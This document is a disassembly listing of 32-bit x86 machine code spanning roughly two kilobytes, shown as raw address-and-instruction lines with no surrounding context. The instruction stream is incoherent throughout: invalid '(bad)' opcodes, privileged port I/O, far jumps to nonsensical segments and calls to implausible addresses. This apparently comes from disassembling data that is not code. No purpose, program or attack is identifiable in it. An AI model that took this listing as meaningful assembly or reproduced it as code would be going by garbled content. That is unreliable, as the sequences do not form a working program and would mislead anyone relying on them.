  412d7c:	repz enter 0xe8ce,0xec
  412d81:	(bad)  
  412d82:	aad    0xef
  412d84:	(bad)  
  412d85:	(bad)  
  412d86:	add    al,BYTE PTR [ebx]
  412d88:	ror    BYTE PTR [ebx],1
  412d8a:	neg    esi
  412d8c:	jmp    0x412d56
  412d8e:	fcomip st,st(3)
  412d90:	loope  0x412d7a
  412d92:	fmul   st(2),st
  412d94:	int3   
  412d95:	lods   al,BYTE PTR ds:[esi]
  412d96:	cmc    
  412d97:	out    dx,eax
  412d98:	call   0xd6281d53
  412d9d:	(bad)  
  412d9f:	aam    0xf8
  412da1:	in     al,dx
  412da2:	sar    esi,0xdb
  412da5:	lock fcmovbe st,st(7)
  412da8:	jecxz  0x412d89
  412daa:	jecxz  0x412d84
  412dac:	stc    
  412dad:	cld    
  412dae:	aad    0xea
  412db0:	or     BYTE PTR [ecx],al
  412db2:	out    0xa8,eax
  412db4:	mov    al,0xbe
  412db6:	mov    cl,0xd2
  412db8:	call   0xdb01f396
  412dbd:	stc    
  412dbe:	into   
  412dbf:	in     eax,dx
  412dc0:	rol    BYTE PTR [ecx],1
  412dc2:	loope  0x412d91
  412dc4:	add    edx,ebx
  412dc6:	aam    0xf5
  412dc8:	(bad)  
  412dc9:	(bad)  
  412dca:	cld    
  412dcb:	(bad)  
  412dcc:	or     edi,ebp
  412dce:	in     eax,dx
  412dcf:	or     bl,cl
  412dd1:	adc    eax,eax
  412dd3:	(bad)  
  412dd4:	jmp    0xfb3318a9
  412dd9:	loop   0x412db4
  412ddb:	leave  
  412ddc:	call   0xbd33edd6
  412de1:	ret    
  412de2:	cmc    
  412de3:	(bad)  
  412de5:	cld    
  412de6:	add    ebx,esp
  412de8:	xlat   BYTE PTR ds:[ebx]
  412de9:	fld    QWORD PTR [ecx]
  412deb:	fmul   DWORD PTR [eax]
  412ded:	stc    
  412dee:	jmp    0xbff1:0xc7e5c8fd
  412df5:	mov    ebp,0xd1e4ebcf
  412dfa:	(bad)  
  412dfc:	fidiv  WORD PTR [ebp-0x15081617]
  412e02:	mov    ebx,0x3e5cded
  412e07:	fdiv   st,st(1)
  412e09:	ret    
  412e0a:	call   esi
  412e0c:	fdecstp 
  412e0e:	or     DWORD PTR [esi+ebp*8],eax
  412e11:	add    eax,0xd5e4e0df
  412e16:	aad    0xce
  412e18:	out    dx,eax
  412e19:	rol    esi,1
  412e1b:	aam    0xfe
  412e1d:	out    dx,eax
  412e1e:	jmp    0x412e0f
  412e20:	int3   
  412e21:	mov    ah,0xd3
  412e23:	mov    ecx,0xd3c7f7e0
  412e28:	jmp    0x412e22
  412e2a:	loop   0x412e35
  412e2c:	(bad)  
  412e2d:	jecxz  0x412e34
  412e2f:	in     eax,dx
  412e30:	out    0xe5,al
  412e32:	test   al,0xc2
  412e34:	icebp  
  412e35:	out    0xf0,eax
  412e37:	div    eax
  412e39:	iret   
  412e3a:	out    0xed,al
  412e3c:	call   0xcb112c2c
  412e41:	leave  
  412e42:	add    ah,ch
  412e44:	add    ah,bh
  412e46:	inc    dh
  412e48:	(bad)  
  412e4a:	fild   DWORD PTR [ecx]
  412e4c:	out    0xcf,al
  412e4e:	jmp    0xc4ae:0xf008fd0d
  412e55:	ret    0xb6d7
  412e58:	loopne 0x412e48
  412e5a:	shl    BYTE PTR [eax+ebp*8-0x3c26413c],cl
  412e61:	in     al,dx
  412e62:	(bad)  
  412e63:	mov    edx,0xdff9bcf9
  412e68:	fcmovb st,st(5)
  412e6a:	out    0xd7,eax
  412e6c:	fild   WORD PTR [ebx]
  412e6e:	cld    
  412e6f:	loope  0x412e6c
  412e71:	adc    DWORD PTR [ebx-0x152a221a],ebp
  412e77:	repnz cli 
  412e79:	repz int 0xea
  412e7c:	into   
  412e7d:	sar    DWORD PTR [esi-0x9201247],cl
  412e83:	lock rcr edi,1
  412e86:	rol    BYTE PTR ds:0x9e3ea00,0xf7
  412e8d:	sti    
  412e8e:	out    dx,eax
  412e8f:	cli    
  412e90:	fist   WORD PTR [edx]
  412e92:	fisubr WORD PTR [ecx+ebp*8-0x48160d0d]
  412e99:	hlt    
  412e9a:	repz sti 
  412e9c:	(bad)  
  412e9e:	(bad)  
  412ea0:	call   esi
  412ea2:	leave  
  412ea3:	mov    esi,0xe6f3de00
  412ea8:	fiadd  WORD PTR [edx]
  412eaa:	loopne 0x412eb3
  412eac:	cld    
  412ead:	lds    eax,FWORD PTR ds:0xf0f80bcb
  412eb3:	retf   
  412eb4:	scas   eax,DWORD PTR es:[edi]
  412eb5:	rol    ecx,0xf7
  412eb8:	(bad)
  412ebc:	shl    DWORD PTR [ebp-0x33362d1b],cl
  412ec2:	sar    eax,1
  412ec4:	ret    0xf8d3
  412ec7:	jecxz  0x412e8f
  412ec9:	retf   0xf6fa
  412ecc:	or     edi,ebp
  412ece:	add    eax,0xe605cfed
  412ed3:	int3   
  412ed4:	mov    edi,0xb1add6f1
  412ed9:	cli    
  412eda:	mov    ch,0xed
  412edc:	mov    bh,0xd6
  412ede:	test   cl,0xce
  412ee1:	int3   
  412ee2:	leave  
  412ee3:	fcmovnu st,st(1)
  412ee5:	add    ebx,edi
  412ee7:	out    0x0,al
  412ee9:	rol    dh,1
  412eeb:	cli    
  412eec:	add    al,0xf4
  412eee:	aad    0xea
  412ef0:	loope  0x412eeb
  412ef2:	leave  
  412ef3:	mov    al,0xdf
  412ef5:	mov    dl,0xb5
  412ef7:	fadd   st(1),st
  412ef9:	xlat   BYTE PTR ds:[ebx]
  412efa:	iret   
  412efb:	clc    
  412efc:	lock aad 0xf1
  412eff:	push   ebp
  412f01:	mov    ah,0xb9
  412f03:	int    0xd9
  412f05:	into   
  412f06:	rol    DWORD PTR [ecx],0x4
  412f09:	(bad)  
  412f0c:	pop    es
  412f0d:	or     esi,ebx
  412f0f:	jmp    0xe2b3:0xbcc002ff
  412f16:	cmc    
  412f17:	mov    dl,0xef
  412f19:	jmp    0xf0d5:0xf4b8ffc9
  412f20:	fucomi st,st(4)
  412f22:	fnstsw WORD PTR [edi+ebx*8-0x2702f825]
  412f29:	cli    
  412f2a:	ret    
  412f2b:	add    bh,al
  412f2d:	add    cl,BYTE PTR [edx]
  412f2f:	pop    es
  412f30:	cli    
  412f31:	shr    BYTE PTR [edx-0x1937392f],cl
  412f37:	(bad)
  412f3a:	hlt    
  412f3b:	rcl    dl,cl
  412f3d:	aam    0xd5
  412f3f:	(bad)  
  412f40:	inc    BYTE PTR [ebx]
  412f42:	fcom   st(3)
  412f44:	out    dx,al
  412f45:	(bad)  
  412f47:	fidivr DWORD PTR [ebp-0x4200fefd]
  412f4d:	or     ecx,eax
  412f4f:	in     eax,dx
  412f50:	dec    al
  412f52:	loopne 0x412f31
  412f54:	mov    bl,0xed
  412f56:	mov    dl,0xad
  412f58:	int3   
  412f59:	jmp    0xe3eb:0xc8d7d8da
  412f60:	fst    st(0)
  412f62:	jecxz  0x412f22
  412f64:	test   DWORD PTR [ecx],0xc1c7e3d5
  412f6a:	fucom  st(4)
  412f6c:	vpmaxub ymm0,ymm5,YMMWORD PTR [edx]
  412f70:	enter  0xb805,0xc5
  412f74:	shr    ch,1
  412f76:	(bad)  
  412f77:	mov    esp,0xf6cbb2c3
  412f7c:	(bad)  
  412f7d:	mov    ebx,0x2bef8fa
  412f82:	call   0xe1283686
  412f87:	hlt    
  412f88:	ret    
  412f89:	(bad)  
  412f8a:	shl    edi,1
  412f8c:	add    ecx,ebp
  412f8e:	cld    
  412f8f:	fucompp 
  412f91:	add    ebp,ecx
  412f93:	lock loop 0x412f72
  412f96:	fdiv   st(3),st
  412f98:	(bad)  
  412f9a:	(bad)  
  412f9b:	icebp  
  412f9c:	(bad)  
  412f9f:	shr    eax,1
  412fa1:	cli    
  412fa2:	fcmovnb st,st(0)
  412fa4:	ret    0x2f2
  412fa7:	cmc    
  412fa8:	loopne 0x412f7e
  412faa:	lock (bad) 
  412fac:	(bad)
  412fb0:	jmp    0xf4f1:0xadeac3ca
  412fb7:	int    0xd4
  412fb9:	loope  0x412fad
  412fbb:	vpsubsw ymm5,ymm3,ymm0
  412fbf:	mov    edi,0xf0bdf9d5
  412fc4:	mov    ch,0xf6
  412fc6:	mov    ebp,0xc7f9f2dd
  412fcb:	(bad)  
  412fcc:	fisttp DWORD PTR [ebx]
  412fce:	loopne 0x412fbc
  412fd0:	repz in al,0xbd
  412fd3:	stos   BYTE PTR es:[edi],al
  412fd4:	out    dx,al
  412fd5:	retf   0xe2b6
  412fd8:	lods   al,BYTE PTR ds:[esi]
  412fd9:	cli    
  412fda:	(bad)  
  412fdb:	in     al,0xc5
  412fdd:	hlt    
  412fde:	mov    edx,0xbff4edcc
  412fe3:	sar    cl,0xec
  412fe6:	mov    esi,0xc1c7dbda
  412feb:	(bad)  
  412fec:	out    dx,eax
  412fed:	push   es
  412fee:	pop    es
  412fef:	add    al,0xe7
  412ff1:	leave  
  412ff2:	repnz scas al,BYTE PTR es:[edi]
  412ff4:	scas   eax,DWORD PTR es:[edi]
  412ff5:	lods   eax,DWORD PTR ds:[esi]
  412ff6:	retf   0xe2c0
  412ff9:	in     al,dx
  412ffa:	out    dx,al
  412ffb:	fcmovbe st,st(4)
  412ffd:	lods   al,BYTE PTR ds:[esi]
  412ffe:	fistp  QWORD PTR [ebp-0xf36040d]
  413004:	icebp  
  413005:	fiadd  WORD PTR [edi]
  413007:	jecxz  0x412fcc
  413009:	test   DWORD PTR [ecx],0xf403cf08
  41300f:	fst    DWORD PTR [edx]
  413011:	in     eax,dx
  413012:	shr    ch,0xe0
  413015:	fdivr  st(0),st
  413017:	cmc    
  413018:	div    dl
  41301a:	out    0xd7,al
  41301c:	(bad)  
  41301e:	in     eax,dx
  41301f:	fdivr  DWORD PTR [esi-0x32172430]
  413025:	out    dx,al
  413026:	(bad)  
  413027:	cli    
  413028:	or     edi,ebx
  41302a:	in     al,0xea
  41302c:	or     edi,ecx
  41302e:	(bad)  
  41302f:	faddp  st(4),st
  413031:	out    0xc0,al
  413033:	int3   
  413034:	lods   al,BYTE PTR ds:[esi]
  413035:	neg    ebp
  413037:	icebp  
  413038:	cmc    
  413039:	fcmove st,st(0)
  41303b:	mov    ebx,0xe4dbd2d2
  413040:	hlt    
  413041:	(bad)  
  413042:	lock out dx,al
  413044:	out    0xbd,al
  413046:	(bad)  
  413047:	jmp    0x413053
  413049:	lock in al,0xd0
  41304c:	out    0xbc,eax
  41304e:	(bad)  
  41304f:	int3   
  413050:	call   0xf2eaee15
  413055:	mov    cl,0xc8
  413057:	out    0xe4,al
  413059:	mov    ch,0xea
  41305b:	retf   0xfacc
  41305e:	stc    
  41305f:	mov    dl,0xbe
  413061:	fdiv   st,st(2)
  413063:	(bad)  
  413064:	(bad)  
  413066:	repz (bad) 
  413068:	cmc    
  413069:	in     al,0xff
  41306b:	(bad)  
  41306d:	jecxz  0x413063
  41306f:	pop    es
  413070:	fisttp QWORD PTR [ecx]
  413072:	in     eax,dx
  413073:	jmp    0x413023
  413075:	mov    dl,0xe6
  413077:	lock loope 0x413071
  41307a:	jmp    0x413066
  41307c:	mov    eax,0xfdefe9ef
  413081:	mov    esi,0xfab9f0e0
  413086:	in     eax,dx
  413087:	add    dh,dl
  413089:	add    edx,ecx
  41308b:	vshufpd xmm7,xmm3,xmm1,0xcb
  413090:	add    dh,dl
  413092:	icebp  
  413093:	ret    0xc3ef
  413096:	scas   eax,DWORD PTR es:[edi]
  413097:	hlt    
  413098:	mov    dh,0xee
  41309a:	in     eax,0xb1
  41309c:	hlt    
  41309d:	clc    
  41309e:	mov    dh,0xf5
  4130a0:	idiv   BYTE PTR [esp+edx*8-0x27211309]
  4130a7:	sar    DWORD PTR [ecx-0x1e171a2b],1
  4130ad:	loop   0x4130b7
  4130af:	or     cl,ch
  4130b1:	or     DWORD PTR [ecx-0x1528390d],edi
  4130b7:	xlat   BYTE PTR ds:[ebx]
  4130b8:	retf   0xb5bb
  4130bb:	rcr    bl,1
  4130bd:	in     al,0xb4
  4130bf:	fcmovu st,st(5)
  4130c1:	fcmovu st,st(2)
  4130c3:	clc    
  4130c4:	clc    
  4130c5:	in     al,dx
  4130c6:	mov    esp,0xd6c3f3c4
  4130cb:	sti    
  4130cc:	rcl    esi,0xe7
  4130cf:	fiadd  WORD PTR [esi]
  4130d1:	in     al,dx
  4130d2:	retf   0xeaca
  4130d5:	lock repz mov bl,0xdb
  4130d9:	out    0xba,eax
  4130db:	mov    ecx,0xe8b6caca
  4130e0:	fmul   st(6),st
  4130e2:	mov    edx,0xc5bfcf03
  4130e7:	mov    ebp,0xe3bcd7
  4130ec:	(bad)  
  4130ee:	sti    
  4130ef:	in     eax,dx
  4130f0:	dec    DWORD PTR ds:0xc1a9aeed
  4130f6:	in     eax,dx
  4130f7:	into   
  4130f8:	shl    eax,0xee
  4130fb:	repz ror dh,1
  4130fe:	cmc    
  4130ff:	lock mov esp,0xe1c2d6fe
  413105:	sti    
  413106:	lock mov ecx,0xf4f7d1f2
  41310d:	(bad)  
  41310e:	or     ebp,esp
  413110:	add    ch,ch
  413112:	shl    esp,cl
  413114:	ret    0xd1c4
  413117:	mov    esp,0xb0f9d6c6
  41311c:	mov    ch,0xfe
  41311e:	mov    esi,0xb8f203d1
  413123:	idiv   BYTE PTR [edi-0x2bfe1c13]
  413129:	repnz out 0x5,eax
  41312c:	or     bh,bh
  41312e:	clts   
  413130:	stc    
  413131:	out    0xcc,eax
  413133:	scas   eax,DWORD PTR es:[edi]
  413134:	jmp    0x4130fd
  413136:	mov    dl,0xd3
  413138:	in     al,0xed
  41313a:	sti    
  41313b:	fsubr  st,st(2)
  41313d:	lock clc 
  41313f:	fiadd  DWORD PTR [ebx]
  413141:	mov    edx,0xd7e6fdf2
  413146:	add    ebx,eax
  413148:	repz push es
  41314a:	jecxz  0x413130
  41314c:	push   es
  41314d:	fcompp 
  41314f:	out    dx,eax
  413150:	in     eax,dx
  413151:	jmp    0xa538e53b
  413156:	div    DWORD PTR [edx-0x4504041b]
  41315c:	fdivrp st(1),st
  41315e:	les    edi,FWORD PTR [eax-0x946220b]
  413164:	int    0xd6
  413166:	in     eax,0xf4
  413168:	add    ecx,ebx
  41316a:	jecxz  0x413151
  41316c:	enter  0xf407,0xce
  413170:	add    bh,al
  413172:	loop   0x41314c
  413174:	(bad)  
  413175:	fmulp  st(5),st
  413177:	scas   al,BYTE PTR es:[edi]
  413178:	jmp    0xe5b6:0xf6c4b6c5
  41317f:	aad    0xf7
  413181:	out    dx,al
  413182:	add    dh,cl
  413184:	jmp    edi
  413186:	in     eax,0x3
  413188:	fdiv   st,st(1)
  41318a:	clc    
  41318b:	or     bl,cl
  41318d:	hlt    
  41318e:	add    eax,0xc40efcdd
  413193:	fadd   st,st(0)
  413195:	mov    al,0xc8
  413197:	lods   eax,DWORD PTR ds:[esi]
  413198:	int    0xec
  41319a:	out    0xbb,eax
  41319c:	int3   
  41319d:	std    
  41319e:	aad    0xb6
  4131a0:	mov    esp,0xcebabff1
  4131a5:	mov    esi,0xc2d5e604
  4131aa:	jmp    0xca082dbe
  4131af:	(bad)  
  4131b1:	loope  0x41318f
  4131b3:	shr    al,1
  4131b5:	test   al,0xf3
  4131b7:	(bad)  
  4131b8:	cmc    
  4131b9:	jmp    0x4131b3
  4131bb:	call   0xd6411c8d
  4131c0:	xlat   BYTE PTR ds:[ebx]
  4131c1:	leave  
  4131c2:	add    dl,bh
  4131c4:	cli    
  4131c5:	loope  0x4131c5
  4131c7:	cli    
  4131c8:	(bad)  
  4131c9:	aam    0x2
  4131cb:	add    esp,esi
  4131cd:	stc    
  4131ce:	loopne 0x4131d8
  4131d0:	enter  0xc8cb,0xf2
  4131d4:	loop   0x4131b3
  4131d6:	jecxz  0x4131c4
  4131d8:	imul   dh
  4131da:	mov    dh,0xef
  4131dc:	out    dx,al
  4131dd:	(bad)  
  4131df:	mov    dl,0xf4
  4131e1:	leave  
  4131e2:	mov    bh,0xe8
  4131e4:	shl    edx,0xbe
  4131e7:	rcl    ch,cl
  4131e9:	sar    bl,0xeb
  4131ec:	push   es
  4131ed:	retf   
  4131ee:	out    0xe3,eax
  4131f0:	(bad)  
  4131f1:	jmp    0xe8e8:0xc5e5adc8
  4131f8:	in     al,0xf5
  4131fa:	shl    DWORD PTR [edi+eax*8-0x8400e28],1
  413201:	fst    st(5)
  413203:	ret    0xd9d9
  413206:	rcr    ecx,cl
  413208:	cmc    
  413209:	shl    edi,0xd8
  41320c:	fldln2 
  41320e:	into   
  41320f:	stc    
  413210:	sar    edi,0xb9
  413213:	mov    al,0xb0
  413215:	leave  
  413216:	scas   eax,DWORD PTR es:[edi]
  413217:	enter  0xc9d1,0xfa
  41321b:	scas   al,BYTE PTR es:[edi]
  41321c:	retf   
  41321d:	mov    al,0xd7
  41321f:	rcr    edi,cl
  413221:	into   
  413222:	fucom  st(1)
  413224:	mov    eax,0xfcf2d7fe
  413229:	lock aam 0xd7
  41322c:	(bad)  
  41322e:	or     dl,BYTE PTR [ebx]
  413230:	add    eax,0xedf1e9fd
  413235:	enter  0xdbc5,0xd4
  413239:	rol    al,0xf0
  41323c:	xlat   BYTE PTR ds:[ebx]
  41323d:	lods   al,BYTE PTR ds:[esi]
  41323e:	sti    
  41323f:	out    dx,al
  413240:	(bad)  
  413241:	out    dx,eax
  413242:	add    BYTE PTR [edi],al
  413244:	aam    0xf1
  413246:	ret    
  413247:	cmc    
  413248:	cmc    
  413249:	push   es
  41324a:	mov    eax,0xcf907f6
  413250:	sti    
  413251:	clc    
  413252:	scas   eax,DWORD PTR es:[edi]
  413253:	lock test al,0xcd
  413257:	lods   al,BYTE PTR ds:[esi]
  413258:	leave  
  413259:	out    0xf4,al
  41325b:	lock (bad) 
  41325d:	(bad)  
  41325f:	mov    dh,0xd2
  413261:	mov    ebx,0xe1c1b6d4
  413266:	(bad)  
  413267:	xlat   BYTE PTR ds:[ebx]
  413268:	ror    BYTE PTR [ecx],1
  41326a:	cmc    
  41326b:	add    al,0xfb
  41326d:	call   0xc9483a61
  413272:	shl    ecx,cl
  413274:	rcr    esp,1
  413276:	in     eax,dx
  413277:	retf   0xecce
  41327a:	mov    bl,0xd3
  41327c:	fpatan 
  41327e:	mov    eax,0xf2f2dfdc
  413283:	mov    dh,0xdd
  413285:	mov    esp,0xead1c2d4
  41328a:	cmc    
  41328b:	ror    al,1
  41328d:	pmuludq mm1,mm7
  413290:	or     ah,ch
  413292:	int3   
  413293:	test   eax,0xccbceaef
  413298:	cmc    
  413299:	loope  0x413267
  41329b:	int    0xca
  41329d:	fdivr  st,st(7)
  41329f:	shr    dl,1
  4132a1:	sar    BYTE PTR [esi-0x18020a12],cl
  4132a7:	or     esp,edi
  4132a9:	(bad)  
  4132aa:	jmp    0x4132a1
  4132ac:	or     ebp,esp
  4132ae:	add    bl,ch
  4132b0:	cli    
  4132b1:	add    eax,0xcea8e8c2
  4132b6:	mov    al,0xbc
  4132b8:	(bad)  
  4132b9:	(bad)  
  4132ba:	out    0xe6,al
  4132bc:	mov    ch,0xfa
  4132be:	hlt    
  4132bf:	in     al,0xf5
  4132c1:	int    0xfc
  4132c3:	fiadd  DWORD PTR [esi]
  4132c5:	in     eax,dx
  4132c6:	add    al,0x4
  4132c8:	fdivp  st(6),st
  4132ca:	retf   
  4132cb:	jmp    0x803:0xdd0de9ea
  4132d2:	enter  0xd2c4,0xeb
  4132d6:	in     al,0xb1
  4132d8:	iret   
  4132d9:	cmc    
  4132da:	icebp  
  4132db:	shl    BYTE PTR [esi-0x152d0b29],0xd1
  4132e2:	enter  0xdee3,0xde
  4132e6:	int    0xc5
  4132e8:	fsub   st,st(0)
  4132ea:	fnsetpm(287 only) 
  4132ec:	out    dx,al
  4132ed:	add    al,0x9
  4132ef:	in     eax,0xe8
  4132f1:	loop   0x4132c4
  4132f3:	iret   
  4132f4:	shl    BYTE PTR [ebx-0x110d1a2f],0xec
  4132fb:	out    0xd1,eax
  4132fd:	into   
  4132fe:	(bad)  
  4132ff:	mov    ecx,0xf8dbf0fd
  413304:	shl    ebp,cl
  413306:	fdivr  QWORD PTR [esi+0xac2c2fd]
  41330c:	stc    
  41330d:	(bad)  
  41330e:	stc    
  41330f:	cli    
  413310:	(bad)  
  413312:	mov    cl,0xdc
  413314:	out    dx,eax
  413315:	test   al,0xc5
  413317:	rol    dh,1
  413319:	enter  0xcee1,0xf4
  41331d:	jmp    0xecff:0xf3f8f9fe
  413324:	ret    
  413325:	cmc    
  413326:	add    al,0xdd
  413328:	loopne 0x41330a
  41332a:	fneni(8087 only) 
  41332c:	jecxz  0x413335
  41332e:	dec    bl
  413330:	call   0xe61a2541
  413335:	(bad)  
  413336:	out    dx,eax
  413337:	rcl    dh,cl
  413339:	out    dx,al
  41333a:	shl    eax,0xfa
  41333d:	mov    dh,0xf0
  41333f:	int3   
  413340:	(bad)  
  413341:	aad    0xf7
  413343:	mov    ebp,0xc0bef3e6
  413348:	mov    ebp,0xeec8d9d5
  41334d:	add    al,BYTE PTR ds:0xbfdcefca
  413353:	int    0xcf
  413355:	out    0xe5,eax
  413357:	icebp  
  413358:	loop   0x413330
  41335a:	scas   eax,DWORD PTR es:[edi]
  41335b:	fprem  
  41335d:	repz in al,0x3
  413360:	fcmovbe st,st(1)
  413362:	mov    ecx,0xf8e1d2d2
  413367:	cli    
  413368:	stc    
  413369:	in     al,0xfd
  41336b:	loopne 0x41332a
  41336d:	out    0xc9,al
  41336f:	iret   
  413370:	add    ah,bh
  413372:	ret    0xe1c7
  413375:	leave  
  413376:	(bad)
  413379:	test   al,0xd4
  41337b:	retf   0xe5ba
  41337e:	std    
  41337f:	xlat   BYTE PTR ds:[ebx]
  413380:	mov    ah,0xf0
  413382:	loop   0x413378
  413384:	clc    
  413385:	shl    esi,0xc0
  413388:	pop    es
  413389:	ret    
  41338a:	or     esp,eax
  41338c:	push   es
  41338d:	add    al,0xce
  41338f:	dec    dh
  413391:	jmp    0xb3e0:0xf6c3cac7
  413398:	out    0xd6,eax
  41339a:	in     al,0xc0
  41339c:	test   al,0xd6
  41339f:	stc    
  4133a0:	into   
  4133a1:	stc    
  4133a2:	mov    esi,0x403ecf8
  4133a7:	in     al,dx
  4133a8:	or     edx,eax
  4133aa:	add    ebx,eax
  4133ac:	xlat   BYTE PTR ds:[ebx]
  4133ad:	vpavgb ymm5,ymm1,ymm3
  4133b1:	loop   0x413399
  4133b3:	mov    cl,0xf3
  4133b5:	int3   
  4133b6:	lods   al,BYTE PTR ds:[esi]
  4133b7:	not    edx
  4133b9:	mov    bl,0xcc
  4133bb:	mov    al,0xd1
  4133bd:	icebp  
  4133be:	ror    dl,cl
  4133c0:	retf   0xb7f9
  4133c3:	add    dh,dh
  4133c5:	aad    0xd2
  4133c7:	in     al,dx
  4133c8:	pop    es
  4133c9:	cli    
  4133ca:	pop    es
  4133cb:	leave  
  4133cc:	push   es
  4133cd:	in     eax,0xdf
  4133cf:	(bad)  
  4133d1:	std    
  4133d2:	ret    
  4133d3:	out    dx,eax
  4133d4:	scas   al,BYTE PTR es:[edi]
  4133d5:	scas   eax,DWORD PTR es:[edi]
  4133d6:	fucomp st(3)
  4133d8:	repnz mov edx,0xd3e5ece0
  4133de:	(bad)  
  4133e0:	jecxz  0x4133e0
  4133e2:	mov    eax,0xccf6daef
  4133e7:	(bad)
  4133ea:	fcmovb st,st(2)
  4133ec:	stc    
  4133ed:	(bad)  
  4133ef:	retf   
  4133f0:	or     bh,al
  4133f2:	mov    dl,0xd7
  4133f4:	imul   esp
  4133f6:	loop   0x4133eb
  4133f8:	lods   eax,DWORD PTR ds:[esi]
  4133f9:	mov    ah,0xf7
  4133fb:	fcmovne st,st(7)
  4133fd:	dec    bh
  4133ff:	mov    esp,0xe2c9f8ba
  413404:	out    dx,al
  413405:	ret    
  413406:	sti    
  413407:	clc    
  413408:	fsubrp st(4),st
  41340a:	add    al,0xe1
  41340c:	out    dx,al
  41340d:	in     eax,0xa
  41340f:	fsubr  st,st(0)
  413411:	into   
  413412:	repz ret 
  413414:	ret    
  413415:	rcl    ah,0xe7
  413418:	out    dx,al
  413419:	sar    DWORD PTR [ebx-0x13531516],0xba
  413420:	in     al,dx
  413421:	rcr    dh,1
  413423:	aam    0xbc
  413425:	add    al,bh
  413427:	fadd   QWORD PTR ds:0xac1dadd
  41342d:	jmp    0xe4e1:0x7f9e60f
  413434:	int    0xc8
  413436:	out    dx,eax
  413437:	int3   
  413438:	lock iret 
  41343a:	retf   
  41343b:	jmp    0xc2b1:0xb9d7edd8
  413442:	aad    0xe2
  413444:	mov    eax,0xdedefafc
  413449:	add    eax,0xe5d8dcc4
  41344e:	add    DWORD PTR [edi+ebx*8],eax
  413451:	or     edi,DWORD PTR [esi-0x5353151e]
  413457:	imul   cl
  413459:	hlt    
  41345a:	loopne 0x413428
  41345c:	jmp    esp
  41345e:	leave  
  41345f:	jmp    0x2ff0123
  413464:	fidivr WORD PTR [ebp-0x3e232b23]
  41346a:	std    
  41346b:	(bad)  
  41346c:	mov    ebp,0xe1fcc4e4
  413471:	jmp    0xaaf5:0xe5f6e2ab
  413478:	in     eax,0xa8
  41347a:	cmc    
  41347b:	out    dx,al
  41347c:	icebp  
  41347d:	into   
  41347e:	aad    0xd5
  413480:	stc    
  413481:	(bad)  
  413483:	std    
  413484:	fsub   st,st(1)
  413486:	add    eax,0xdc0bbde6
  41348b:	cld    
  41348c:	xlat   BYTE PTR ds:[ebx]
  41348d:	(bad)  
  41348e:	aam    0xd9
  413490:	or     ch,cl
  413492:	jmp    0xd30b0289
  413497:	scas   al,BYTE PTR es:[edi]
  413498:	(bad)  
  413499:	call   0xc9321c54
  41349e:	enter  0xf7de,0xd2
  4134a2:	stc    
  4134a3:	mov    dh,0xf5
  4134a5:	rol    BYTE PTR [edi],0xd7
  4134a8:	out    0x4,eax
  4134aa:	(bad)  
  4134ab:	fcmovnb st,st(4)
  4134ad:	fcomp  st(2)
  4134af:	sti    
  4134b0:	fxch   st(1)
  4134b2:	out    0xe2,al
  4134b4:	retf   0xd0e8
  4134b7:	retf   
  4134b8:	int3   
  4134b9:	in     eax,dx
  4134ba:	out    0xf5,eax
  4134bc:	mov    dh,0xb9
  4134be:	(bad)  
  4134c0:	rol    edx,1
  4134c2:	in     al,dx
  4134c3:	in     eax,dx
  4134c4:	aam    0xf1
  4134c6:	int3   
  4134c7:	out    0xe5,eax
  4134c9:	jmp    0x4134a4
  4134cb:	out    0xfd,eax
  4134cd:	test   BYTE PTR [esi],0xc6
  4134d0:	repnz jmp 0xc4ac:0xbeaee1be
  4134d8:	in     eax,dx
  4134d9:	repz fucomi st,st(5)
  4134dc:	xlat   BYTE PTR ds:[ebx]
  4134dd:	jmp    0x3d4:0xc8d6ffec
  4134e4:	ret    0xc3f9
  4134e7:	(bad)
  4134ea:	jmp    0x4134f0
  4134ec:	clc    
  4134ed:	iret   
  4134ee:	add    al,0xf4
  4134f0:	out    dx,eax
  4134f1:	add    ebx,esi
  4134f3:	scas   eax,DWORD PTR es:[edi]
  4134f4:	jecxz  0x4134b2
  4134f6:	lods   al,BYTE PTR ds:[esi]
  4134f7:	call   0xeef7fab7
  4134fc:	mov    edx,0xf3fbfdd4
  413501:	repz fst st(5)
  413504:	icebp  
  413505:	xlat   BYTE PTR ds:[ebx]
  413506:	inc    DWORD PTR [edi]
  413508:	(bad)
  41350b:	xlat   BYTE PTR ds:[ebx]
  41350c:	in     al,0xe0
  41350e:	call   0xca1a21f4
  413513:	mov    esi,0xfbf4a8a9
  413518:	jmp    0xfdec:0xd7e8dae1
  41351f:	(bad)  
  413520:	jmp    0x413501
  413522:	faddp  st(3),st
  413524:	loopne 0x413521
  413526:	icebp  
  413527:	loopne 0x41350d
  413529:	add    ebx,ebx
  41352b:	push   es
  41352c:	les    eax,FWORD PTR [ebx]
  41352e:	add    ecx,ebp
  413530:	clc    
  413531:	fld    st(1)
  413533:	fistp  QWORD PTR [esi-0x4a553450]
  413539:	(bad)  
  41353a:	out    dx,eax
  41353b:	shl    BYTE PTR [esi-0x44050a29],1
  413541:	aam    0xd7
  413543:	add    ah,dl
  413545:	xlat   BYTE PTR ds:[ebx]
  413546:	(bad)  
  413547:	mov    esi,0xdae400fb
  41354c:	paddw  mm0,QWORD PTR [edi]
  41354f:	or     ebp,ecx
  413551:	std    
  413552:	jmp    0xca29e828
  413557:	int3   
  413558:	mov    bh,0xb1
  41355a:	in     eax,0xb1
  41355c:	aam    0xdb
  41355e:	jmp    0x413548
  413560:	in     al,dx
  413561:	stc    
  413562:	loopne 0x41355d
  413564:	add    ecx,ebx
  413566:	mov    ch,0xda
  413569:	or     edx,eax
  41356b:	retf   
  41356c:	retf   
  41356d:	fdivr  st,st(2)
  41356f:	in     eax,0x7
  413571:	jmp    ecx
  413573:	ret    0xd3d3
  413576:	mov    bl,0xe7
  413578:	repnz mov dh,0xe8
  41357b:	out    0xba,eax
  41357d:	repnz into 
  41357f:	jmp    0xd4d0:0xced1e9f3
  413586:	add    al,0xdc
  413588:	loope  0x41357e
  41358a:	loope  0x413597
  41358c:	fiadd  WORD PTR [edi]
  41358e:	or     ch,bl
  413590:	loope  0x41359b
  413592:	int    0xe8
  413594:	in     eax,0xed
  413596:	mov    dh,0xe0
  413598:	idiv   bl
  41359a:	mov    bh,0xda
  41359c:	mov    al,0xbf
  41359e:	fucomip st,st(6)
  4135a0:	call   0xdd3123a8
  4135a5:	stc    
  4135a6:	not    esp
  4135a8:	repz in al,0x6
  4135ab:	jmp    0x4135a2
  4135ad:	pop    es
  4135ae:	cli    
  4135af:	add    cl,ch
  4135b1:	add    edx,ebx
  4135b3:	repnz repnz jmp 0xc4ee:0xdbd3b1e6
  4135bc:	ror    edi,1
